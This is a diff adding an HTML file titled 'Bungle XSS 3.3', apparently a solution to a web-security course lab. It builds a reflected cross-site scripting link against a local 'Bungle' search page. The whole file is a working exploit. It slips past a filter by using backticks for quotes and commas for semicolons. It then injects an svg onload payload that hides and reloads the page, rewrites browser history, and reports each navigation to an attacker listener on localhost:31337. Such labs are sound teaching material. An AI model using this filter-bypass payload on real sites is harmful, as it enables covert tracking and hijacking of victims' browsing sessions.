@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>Bungle XSS 3.3</title>
+</head>
+
+<body>
+
+	<h3 id="bungle-link"></h3>
+
+	<script>
+		// Backticks replace the blocked quotes; commas replace the blocked semicolons.
+		function makeLink(xssdefense, target, attacker) {
+			// Keep the unquoted event-handler value free of spaces as well.
+			var payloadCode = "!function(){l=function(d){console.log($.param(d)),$.get(`" +
+				attacker +
+				"`,d)},p=function(h){$(`html`).load(h,function(){history.replaceState(null,``,h),$(`html`).show(),l({event:`nav`,uri:h}),$(`#query`).val(`pwned!`)})},$(`html`).hide(),p(`./`)}()";
+			var injectedPayload = "<svg/onload=" + payloadCode + ">";
+
+			return target + "search?xssdefense=" + xssdefense +
+				"&q=" + encodeURIComponent(injectedPayload);
+		}
+
+		// Bungle reflects q; the listener receives the activity reported by the payload.
+		var target = "http://localhost/project2/";
+		var attacker = "http://localhost:31337/";
+		var url = makeLink(3, target, attacker);
+		var link = document.createElement("a");
+
+		link.href = url;
+		link.textContent = "Try Bungle!";
+		document.getElementById("bungle-link").appendChild(link);
+	</script>
+
+</body>
+
+</html>
